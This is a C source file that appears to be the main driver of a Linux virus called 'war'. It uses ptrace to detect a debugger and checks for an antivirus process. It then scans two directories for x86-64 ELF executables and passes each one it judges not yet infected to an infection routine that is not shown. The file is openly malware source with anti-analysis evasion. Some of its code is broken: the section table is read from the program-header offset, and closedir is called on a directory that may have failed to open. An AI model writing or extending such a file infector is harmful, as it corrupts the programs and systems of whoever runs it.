#include "../incl/war.h"

int ft_readelf(t_war *war)
{
    war->elf = mmap(NULL, war->file_info.st_size, PROT_READ, MAP_PRIVATE, war->fd, 0);
    if (war->elf == MAP_FAILED)
    {
        close(war->fd);
        return (-1);
    }
    if (war->file_info.st_size >= (off_t)sizeof(Elf64_Ehdr) && war->elf[0] == 0x7f && war->elf[1] == 'E' && war->elf[2] == 'L' && war->elf[3] == 'F')
    {
        war->file_size = war->file_info.st_size;
        war->header = (Elf64_Ehdr *)war->elf;
        if ((war->header->e_ident[EI_CLASS] == ELFCLASS64) && war->header->e_machine == EM_X86_64)
            return (0);
    }
    munmap(war->elf, war->file_info.st_size);
    close(war->fd);
    return (-1);
}

int ft_checkarg(t_war *war)
{
    war->fd = open(war->binary, O_RDONLY);
    if (war->fd == -1)
        return (-1);
    if (fstat(war->fd, &war->file_info) == -1)
    {
        close(war->fd);
        return (-1);
    }
    if(S_ISDIR(war->file_info.st_mode))
    {
        close(war->fd);
        return (-1);
    }
    return (ft_readelf(war));
}

int main(void)
{
    t_war   *war;
    char    path[1024];

    if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1)
        exit(1);
    war = malloc(sizeof(t_war));
    if (!war)
        return (1);
    memset(war, 0, sizeof(t_war));
    war->antivirus = 0;
    war->fd = -1;
    ft_antiprocess(war);

    if (war->antivirus != 1)
    {
        for (int i = 0; i < 2; i++)
        {
            war->dir = opendir(ft_getdir(i));
            if (war->dir)
            {
                while ((war->read_dir = readdir(war->dir)) != NULL)
                {
                    snprintf(path, sizeof(path), "%s/%s", ft_getdir(i), war->read_dir->d_name);
                    if (war->read_dir->d_name[0] == '.')
                        continue;
                    war->binary = path;
                    if (ft_checkarg(war) == -1)
                        continue;
                    war->sectab = (Elf64_Shdr *)(war->elf + war->header->e_phoff);
                    war->strtab = (char *)(war->elf + war->sectab[war->header->e_shstrndx].sh_offset);
                    if (!ft_is_infection(war))
                        ft_infect(war);                
                    }
            }
            closedir(war->dir);
        }
    }
    free(war);
    return (0);
}